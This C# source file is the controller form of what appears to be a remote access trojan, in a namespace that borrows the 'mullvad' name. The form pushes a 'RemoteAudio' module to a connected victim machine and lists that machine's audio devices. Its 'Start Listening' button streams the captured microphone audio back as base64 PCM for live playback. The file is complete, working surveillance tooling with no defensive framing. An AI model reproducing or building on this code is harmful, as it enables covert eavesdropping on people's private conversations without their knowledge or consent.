using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class RemoteAudioForm : Form
    {
        private const string ModuleFile = "mullvad.Module.RemoteAudio";
        private const string ModuleId   = "mullvad.remoteaudio";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private static readonly Dictionary<ClientHandler, RemoteAudioForm> _openForms = new();

        public static RemoteAudioForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new RemoteAudioForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        // ── UI ────────────────────────────────────────────────────────────────
        private ComboBox              _cmbDevices  = null!;
        private Button                _btnStart    = null!, _btnStop = null!;
        private Label                 _lblStatus   = null!;
        private ToolStripStatusLabel  _lblBar      = null!;

        // ── Playback state ────────────────────────────────────────────────────
        private volatile bool          _streaming;
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private IntPtr                  _hwo = IntPtr.Zero;
        private readonly object         _playLock = new object();
        private int                     _sampleRate, _channels, _bits;

        private RemoteAudioForm(ClientHandler handler)
        {
            _handler = handler;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text          = "Remote Audio  —  " + _handler.Info.Computer;
            ClientSize    = new System.Drawing.Size(380, 130);
            FormBorderStyle = FormBorderStyle.FixedDialog;
            MaximizeBox   = false;
            Font          = new System.Drawing.Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterParent;
            ShowInTaskbar = true;

            var iconBmp = IconLoader.Load("audio.ico") as System.Drawing.Bitmap;
            if (iconBmp is not null) try { Icon = System.Drawing.Icon.FromHandle(iconBmp.GetHicon()); } catch { }

            var lbl = new Label { Text = "Audio Device:", Left = 10, Top = 14, AutoSize = true };
            _cmbDevices = new ComboBox { Left = 100, Top = 10, Width = 260, DropDownStyle = ComboBoxStyle.DropDownList };

            _btnStart = new Button { Text = "Start Listening", Left = 10, Top = 48, Width = 120, Height = 28, FlatStyle = FlatStyle.Flat };
            _btnStop  = new Button { Text = "Stop",           Left = 138, Top = 48, Width = 70,  Height = 28, FlatStyle = FlatStyle.Flat, Enabled = false };
            _lblStatus = new Label { Text = "Status: Ready", Left = 10, Top = 85, Width = 350, AutoSize = true };

            var strip = new StatusStrip { SizingGrip = false };
            _lblBar = new ToolStripStatusLabel("Ready") { Spring = true };
            strip.Items.Add(_lblBar);

            _btnStart.Click += BtnStart_Click;
            _btnStop.Click  += BtnStop_Click;

            Controls.AddRange(new Control[] { lbl, _cmbDevices, _btnStart, _btnStop, _lblStatus, strip });

            Load       += OnLoad;
            FormClosed += OnFormClosed;

            ResumeLayout(false);
        }

        private async void OnLoad(object? sender, EventArgs e)
        {
            _btnStart.Enabled = false;
            _lblStatus.Text   = "Status: Delivering module…";
            _handler.Disconnected += OnClientDisconnected;

            var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
            if (bytes == null) { _lblStatus.Text = "Status: Module file not found."; return; }

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes,
                new Progress<string>(m => _lblStatus.Text = "Status: " + m), cts.Token);

            if (!ok) { _lblStatus.Text = "Status: Module delivery failed."; return; }

            _ctx = new ModuleContext(_handler, ModuleId);
            _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

            // Enumerate remote devices
            try
            {
                using var cts2 = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var resp = await _ctx.ExecuteAsync("devices", "", cts2.Token);
                PopulateDevices(resp);
            }
            catch { _cmbDevices.Items.Add("Default Device"); _cmbDevices.SelectedIndex = 0; }

            _btnStart.Enabled = true;
            _lblStatus.Text   = "Status: Ready";
        }

        private void OnFormClosed(object? sender, FormClosedEventArgs e)
        {
            _handler.Disconnected -= OnClientDisconnected;
            StopAudio();
            _cts.Dispose();
            _ctx?.Dispose();
            CloseWaveOut();
        }

        private void OnClientDisconnected(ClientHandler _)
        {
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                StopAudio();
                _btnStart.Enabled = false;
                _lblStatus.Text   = "Status: Disconnected.";
            });
        }

        private void PopulateDevices(string json)
        {
            _cmbDevices.Items.Clear();
            int idx = json.IndexOf("[");
            if (idx < 0) { _cmbDevices.Items.Add("Default Device"); _cmbDevices.SelectedIndex = 0; return; }
            int end = json.LastIndexOf("]");
            if (end < idx) { _cmbDevices.Items.Add("Default Device"); _cmbDevices.SelectedIndex = 0; return; }

            int i = idx + 1;
            while (i < end)
            {
                while (i < end && json[i] != '{') i++;
                if (i >= end) break;
                int start = i++;
                int depth = 1;
                while (i < end && depth > 0)
                {
                    if (json[i] == '{') depth++;
                    else if (json[i] == '}') depth--;
                    i++;
                }
                var obj = json.Substring(start, i - start);
                int id   = ParseInt(obj, "id", -1);
                var name = GetStr(obj, "name") ?? "Device " + id;
                _cmbDevices.Items.Add(new DeviceItem(id, name));
            }

            if (_cmbDevices.Items.Count == 0)
                _cmbDevices.Items.Add(new DeviceItem(0, "Default Device"));
            _cmbDevices.SelectedIndex = 0;
        }

        // ── Start / Stop ──────────────────────────────────────────────────────

        private async void BtnStart_Click(object? sender, EventArgs e)
        {
            if (_streaming || _ctx == null) return;
            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;
            _streaming        = true;

            var device = _cmbDevices.SelectedItem is DeviceItem di ? di.Id : 0;

            try
            {
                _cts?.Dispose();
                _cts = new CancellationTokenSource();

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var resp = await _ctx.ExecuteAsync("start_stream", "{\"device\":" + device + "}", cts.Token);

                _sampleRate = ParseInt(resp, "sampleRate", 22050);
                _channels   = ParseInt(resp, "channels",   1);
                _bits       = ParseInt(resp, "bits",       16);

                OpenWaveOut(_sampleRate, _channels, _bits);
                _lblStatus.Text = "Status: Listening…";

                _ = StreamLoopAsync(_cts.Token);
            }
            catch (Exception ex)
            {
                StopAudio();
                _lblStatus.Text = "Status: Failed — " + ex.Message;
            }
        }

        private void BtnStop_Click(object? sender, EventArgs e) => StopAudio();

        private void StopAudio()
        {
            if (!_streaming) return;
            _streaming = false;
            _cts?.Cancel();
            if (_ctx != null)
                _ = Task.Run(async () =>
                {
                    try { using var cts = new CancellationTokenSource(3000); await _ctx.ExecuteAsync("stop_stream", "", cts.Token); } catch { }
                });
            CloseWaveOut();
            if (!IsDisposed) BeginInvoke(() =>
            {
                _btnStart.Enabled = true;
                _btnStop.Enabled  = false;
                _lblStatus.Text   = "Status: Stopped.";
            });
        }

        private async Task StreamLoopAsync(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && _streaming && _ctx != null)
            {
                try
                {
                    // 5-second per-call timeout; only break on OUTER cancellation
                    using var callCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    callCts.CancelAfter(TimeSpan.FromSeconds(5));

                    var resp = await _ctx.ExecuteAsync("get_audio", "", callCts.Token);

                    if (resp?.Contains("\"ok\":true") == true)
                    {
                        int di = resp.IndexOf("\"data\":\"");
                        if (di >= 0)
                        {
                            int s = di + 8, e = resp.IndexOf('"', s);
                            if (e > s)
                            {
                                var pcm = Convert.FromBase64String(resp.Substring(s, e - s));
                                PlayPcm(pcm);
                            }
                        }
                    }
                    else
                    {
                        // No audio ready — brief pause before the next poll
                        await Task.Delay(15, ct);
                    }
                }
                catch (OperationCanceledException) when (ct.IsCancellationRequested)
                {
                    break; // outer cancellation → stop cleanly
                }
                catch (OperationCanceledException)
                {
                    // inner per-call timeout → retry
                }
                catch { break; }
            }

            if (!IsDisposed) BeginInvoke(() => { if (_streaming) StopAudio(); });
        }

        // ── WaveOut playback ──────────────────────────────────────────────────

        private void OpenWaveOut(int sampleRate, int channels, int bits)
        {
            CloseWaveOut();
            var wfx = new WAVEFORMATEX
            {
                wFormatTag      = 1,
                nChannels       = (ushort)channels,
                nSamplesPerSec  = (uint)sampleRate,
                wBitsPerSample  = (ushort)bits,
                nBlockAlign     = (ushort)(channels * bits / 8),
                nAvgBytesPerSec = (uint)(sampleRate * channels * bits / 8),
                cbSize          = 0,
            };
            IntPtr hwo = IntPtr.Zero;
            waveOutOpen(ref hwo, WAVE_MAPPER, ref wfx, IntPtr.Zero, IntPtr.Zero, 0);
            _hwo = hwo;
        }

        private void CloseWaveOut()
        {
            if (_hwo != IntPtr.Zero)
            {
                waveOutReset(_hwo);
                waveOutClose(_hwo);
                _hwo = IntPtr.Zero;
            }
        }

        // Offset of dwFlags inside WAVEHDR (x64): lpData(8)+dwBufferLength(4)+dwBytesRecorded(4)+dwUser(8) = 24
        private const int WaveHdrFlagsOffset = 24;
        private const uint WHDR_DONE = 0x00000001;

        private void PlayPcm(byte[] data)
        {
            var hwo = _hwo; // capture so Task.Run closure doesn't race with CloseWaveOut
            if (hwo == IntPtr.Zero) return;

            var pinned = GCHandle.Alloc(data, GCHandleType.Pinned);
            var hdr = new WAVEHDR_OUT
            {
                lpData         = pinned.AddrOfPinnedObject(),
                dwBufferLength = (uint)data.Length,
            };
            var hdrPin = GCHandle.Alloc(hdr, GCHandleType.Pinned);
            IntPtr pHdr = hdrPin.AddrOfPinnedObject();
            waveOutPrepareHeader(hwo, pHdr, (uint)Marshal.SizeOf(typeof(WAVEHDR_OUT)));
            waveOutWrite(hwo, pHdr, (uint)Marshal.SizeOf(typeof(WAVEHDR_OUT)));

            // Poll WHDR_DONE flag — WaveOut sets it when the buffer has actually finished,
            // so we never call waveOutUnprepareHeader on a buffer that's still in use.
            Task.Run(() =>
            {
                int waited = 0;
                while (waited < 10_000)
                {
                    if (((uint)Marshal.ReadInt32(pHdr, WaveHdrFlagsOffset) & WHDR_DONE) != 0)
                        break;
                    Thread.Sleep(5);
                    waited += 5;
                }
                waveOutUnprepareHeader(hwo, pHdr, (uint)Marshal.SizeOf(typeof(WAVEHDR_OUT)));
                hdrPin.Free();
                pinned.Free();
            });
        }

        // ── P/Invoke ──────────────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX { public ushort wFormatTag, nChannels; public uint nSamplesPerSec, nAvgBytesPerSec; public ushort nBlockAlign, wBitsPerSample, cbSize; }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEHDR_OUT { public IntPtr lpData; public uint dwBufferLength, dwBytesRecorded; public IntPtr dwUser; public uint dwFlags, dwLoops; public IntPtr lpNext, reserved; }

        const uint WAVE_MAPPER = unchecked((uint)-1);

        [DllImport("winmm.dll")] static extern uint waveOutOpen(ref IntPtr phwo, uint uDeviceID, ref WAVEFORMATEX pwfx, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] static extern uint waveOutClose(IntPtr hwo);
        [DllImport("winmm.dll")] static extern uint waveOutReset(IntPtr hwo);
        [DllImport("winmm.dll")] static extern uint waveOutPrepareHeader(IntPtr hwo, IntPtr pwh, uint cbwh);
        [DllImport("winmm.dll")] static extern uint waveOutUnprepareHeader(IntPtr hwo, IntPtr pwh, uint cbwh);
        [DllImport("winmm.dll")] static extern uint waveOutWrite(IntPtr hwo, IntPtr pwh, uint cbwh);

        // ── Helpers ───────────────────────────────────────────────────────────

        private class DeviceItem
        {
            public int Id { get; }
            private readonly string _name;
            public DeviceItem(int id, string name) { Id = id; _name = name; }
            public override string ToString() => _name;
        }

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k = "\"" + key + "\""; int idx = json.IndexOf(k); if (idx < 0) return def;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return def;
            int s = c + 1; while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-'; if (neg) s++;
            int e = s; while (e < json.Length && char.IsDigit(json[e])) e++;
            return e == s ? def : int.TryParse(json.Substring(s, e - s), out int v) ? (neg ? -v : v) : def;
        }

        private static string GetStr(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            var k = "\"" + key + "\""; int idx = json.IndexOf(k); if (idx < 0) return null;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return null;
            int s = c + 1; while (s < json.Length && json[s] == ' ') s++;
            if (s >= json.Length || json[s] != '"') return null; s++;
            var sb = new StringBuilder();
            for (int i = s; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length) { switch (json[++i]) { case '"': sb.Append('"'); break; case '\\': sb.Append('\\'); break; default: sb.Append(json[i]); break; } }
                else if (json[i] == '"') break;
                else sb.Append(json[i]);
            }
            return sb.ToString();
        }
    }
}
